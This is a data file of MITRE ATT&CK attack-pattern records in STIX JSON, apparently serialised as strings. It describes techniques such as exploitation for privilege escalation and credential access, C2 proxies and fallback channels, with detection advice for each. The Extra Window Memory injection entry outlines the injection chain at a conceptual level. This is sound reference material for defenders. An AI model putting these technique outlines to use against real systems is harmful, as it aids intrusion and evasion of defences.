    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\\n\\nSeveral types exist:\\n\\n### Browser-based Exploitation\\n\\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\\n\\n### Office Applications\\n\\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\\n\\n### Common Third-party Applications\\n\\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.\",\"external_references\":[{\"external_id\":\"T1203\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1203\"}],\"id\":\"attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-28T19:06:02.690Z\",\"name\":\"Exploitation for Client Execution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Anti-virus\",\"System calls\",\"Process monitoring\"],\"x_mitre_detection\":\"Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_remote_support\":true,\"x_mitre_system_requirements\":[\"Remote exploitation for execution requires a remotely accessible service reachable over the network or other vector of access such as spearphishing or drive-by compromise.\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u{a0}Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.\",\"external_references\":[{\"external_id\":\"T1212\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1212\"},{\"description\":\"Microsoft. (2014, November 18). Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780). Retrieved December 23, 2015.\",\"source_name\":\"Technet MS14-068\",\"url\":\"https://technet.microsoft.com/en-us/library/security/ms14-068.aspx\"},{\"description\":\"Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.\",\"source_name\":\"ADSecurity Detecting Forged Tickets\",\"url\":\"https://adsecurity.org/?p=1515\"}],\"id\":\"attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-25T18:51:01.070Z\",\"name\":\"Exploitation for Credential Access\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"John Lambert, Microsoft Threat Intelligence Center\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"Windows Error Reporting\",\"Process monitoring\"],\"x_mitre_detection\":\"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u{a0}Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\\n\\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\",\"external_references\":[{\"external_id\":\"T1211\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1211\"}],\"id\":\"attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T20:00:46.900Z\",\"name\":\"Exploitation for Defense Evasion\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"John Lambert, Microsoft Threat Intelligence Center\"],\"x_mitre_data_sources\":[\"Windows Error Reporting\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"System access controls\"],\"x_mitre_detection\":\"Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:30:55.066Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exploit software vulnerabilities in an attempt to collect elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\\n\\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.\",\"external_references\":[{\"external_id\":\"T1068\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1068\"}],\"id\":\"attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-26T21:12:49.194Z\",\"name\":\"Exploitation for Privilege Escalation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Error Reporting\",\"Process monitoring\",\"Application logs\"],\"x_mitre_detection\":\"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery.\\n\\nHigher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.\",\"x_mitre_effective_permissions\":[\"User\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u{a0}A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\\n\\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Scanning](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\\n\\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\\n\\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.\",\"external_references\":[{\"external_id\":\"T1210\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1210\"},{\"description\":\"CIS. (2017, May 15). Multiple Vulnerabilities in Microsoft Windows SMB Server Could Allow for Remote Code Execution. Retrieved April 3, 2018.\",\"source_name\":\"CIS Multiple SMB Vulnerabilities\",\"url\":\"https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/\"},{\"description\":\"National Vulnerability Database. (2017, June 22). CVE-2017-0176 Detail. Retrieved April 3, 2018.\",\"source_name\":\"NVD CVE-2017-0176\",\"url\":\"https://nvd.nist.gov/vuln/detail/CVE-2017-0176\"},{\"description\":\"National Vulnerability Database. (2017, February 2). CVE-2016-6662 Detail. Retrieved April 3, 2018.\",\"source_name\":\"NVD CVE-2016-6662\",\"url\":\"https://nvd.nist.gov/vuln/detail/CVE-2016-6662\"},{\"description\":\"National Vulnerability Database. (2017, September 24). CVE-2014-7169 Detail. Retrieved April 3, 2018.\",\"source_name\":\"NVD CVE-2014-7169\",\"url\":\"https://nvd.nist.gov/vuln/detail/CVE-2014-7169\"}],\"id\":\"attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-02-04T20:14:11.064Z\",\"name\":\"Exploitation of Remote Services\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Error Reporting\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_system_requirements\":[\"Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network.\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-02-20T14:34:08.496Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)\",\"external_references\":[{\"external_id\":\"T1491.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1491/002\"},{\"description\":\"FireEye. (n.d.). Retrieved April 19, 2019.\",\"source_name\":\"FireEye Cyber Threats to Media Industries\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/ib-entertainment.pdf\"},{\"description\":\"Kevin Mandia. (2017, March 30). Prepared Statement of Kevin Mandia, CEO of FireEye, Inc. before the United States Senate Select Committee on Intelligence. Retrieved April 19, 2019.\",\"source_name\":\"Kevin Mandia Statement to US Senate Committee on Intelligence\",\"url\":\"https://www.intelligence.senate.gov/sites/default/files/documents/os-kmandia-033017.pdf\"},{\"description\":\"Andy. (2018, May 12). ‘Anonymous’ Hackers Deface Russian Govt. Site to Protest Web-Blocking (NSFW). Retrieved April 19, 2019.\",\"source_name\":\"Anonymous Hackers Deface Russian Govt Site\",\"url\":\"https://torrentfreak.com/anonymous-hackers-deface-russian-govt-site-to-protest-web-blocking-nsfw-180512/\"},{\"description\":\"Marco Balduzzi, Ryan Flores, Lion Gu, Federico Maggi, Vincenzo Ciancaglini, Roel Reyes, Akira Urano. (n.d.). A Deep Dive into Defacement: How Geopolitical Events Trigger Web Attacks. Retrieved April 19, 2019.\",\"source_name\":\"Trend Micro Deep Dive Into Defacement\",\"url\":\"https://documents.trendmicro.com/assets/white_papers/wp-a-deep-dive-into-defacement.pdf\"}],\"id\":\"attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-04-22T15:19:31.380Z\",\"name\":\"External Defacement\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Web logs\",\"Web application firewall logs\",\"Packet capture\"],\"x_mitre_detection\":\"Monitor external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\",\"x_mitre_impact_type\":[\"Integrity\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-14T23:12:18.466Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\\n\\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.\",\"external_references\":[{\"external_id\":\"T1090.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1090/002\"},{\"description\":\"Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.\",\"source_name\":\"Trend Micro APT Attack Tools\",\"url\":\"http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-27T17:50:37.411Z\",\"name\":\"External Proxy\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:44.421Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) can also be used externally.\\n\\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\",\"external_references\":[{\"external_id\":\"T1133\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1133\"},{\"external_id\":\"CAPEC-555\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/555.html\"},{\"description\":\"Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.\",\"source_name\":\"Volexity Virtual Private Keylogging\",\"url\":\"https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/\"}],\"id\":\"attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-06-19T20:07:09.600Z\",\"name\":\"External Remote Services\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Daniel Oakley\",\"Travis Smith, Tripwire\"],\"x_mitre_data_sources\":[\"Authentication logs\"],\"x_mitre_detection\":\"Follow best practices for detecting adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Linux\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1181\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1181\"},{\"description\":\"Microsoft. (n.d.). About Window Classes. Retrieved December 16, 2017.\",\"source_name\":\"Microsoft Window Classes\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx\"},{\"description\":\"Microsoft. (n.d.). GetWindowLong function. Retrieved December 16, 2017.\",\"source_name\":\"Microsoft GetWindowLong function\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx\"},{\"description\":\"Microsoft. (n.d.). SetWindowLong function. Retrieved December 16, 2017.\",\"source_name\":\"Microsoft SetWindowLong function\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"MalwareTech. (2013, August 13). PowerLoader Injection – Something truly amazing. Retrieved December 16, 2017.\",\"source_name\":\"MalwareTech Power Loader Aug 2013\",\"url\":\"https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html\"},{\"description\":\"Matrosov, A. (2013, March 19). Gapz and Redyms droppers based on Power Loader code. Retrieved December 16, 2017.\",\"source_name\":\"WeLiveSecurity Gapz and Redyms Mar 2013\",\"url\":\"https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/\"},{\"description\":\"Microsoft. (n.d.). SendNotifyMessage function. Retrieved December 16, 2017.\",\"source_name\":\"Microsoft SendNotifyMessage function\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx\"}],\"id\":\"attack-pattern--52f3d5a6-8a0f-4f82-977e-750abf90d0b0\",\"modified\":\"2020-01-14T17:23:05.736Z\",\"name\":\"Extra Window Memory Injection\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-14T17:18:32.126Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \\n\\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\\n\\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\\n\\nExecution granted through EWM injection may allow access to both the target process\'s memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\\n\\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. \",\"external_references\":[{\"external_id\":\"T1055.011\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/011\"},{\"description\":\"Microsoft. (n.d.). About Window Classes. Retrieved December 16, 2017.\",\"source_name\":\"Microsoft Window Classes\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx\"},{\"description\":\"Microsoft. (n.d.). GetWindowLong function. Retrieved December 16, 2017.\",\"source_name\":\"Microsoft GetWindowLong function\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx\"},{\"description\":\"Microsoft. (n.d.). SetWindowLong function. Retrieved December 16, 2017.\",\"source_name\":\"Microsoft SetWindowLong function\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"MalwareTech. (2013, August 13). PowerLoader Injection – Something truly amazing. Retrieved December 16, 2017.\",\"source_name\":\"MalwareTech Power Loader Aug 2013\",\"url\":\"https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html\"},{\"description\":\"Matrosov, A. (2013, March 19). Gapz and Redyms droppers based on Power Loader code. Retrieved December 16, 2017.\",\"source_name\":\"WeLiveSecurity Gapz and Redyms Mar 2013\",\"url\":\"https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/\"},{\"description\":\"Microsoft. (n.d.). SendNotifyMessage function. Retrieved December 16, 2017.\",\"source_name\":\"Microsoft SendNotifyMessage function\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx\"}],\"id\":\"attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:26:33.191Z\",\"name\":\"Extra Window Memory Injection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong (Citation: Microsoft GetWindowLong function) and SetWindowLong (Citation: Microsoft SetWindowLong function). Malware associated with this technique have also used SendNotifyMessage (Citation: Microsoft SendNotifyMessage function) to trigger the associated window procedure and eventual malicious injection. (Citation: Endgame Process Injection July 2017)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:21.689Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.\",\"external_references\":[{\"external_id\":\"T1008\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1008\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2019-07-17T21:17:03.445Z\",\"name\":\"Fallback Channels\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Malware reverse engineering\",\"Netflow/Enclave netflow\",\"Packet capture\",\"Process monitoring\",\"Process use of network\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\",\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
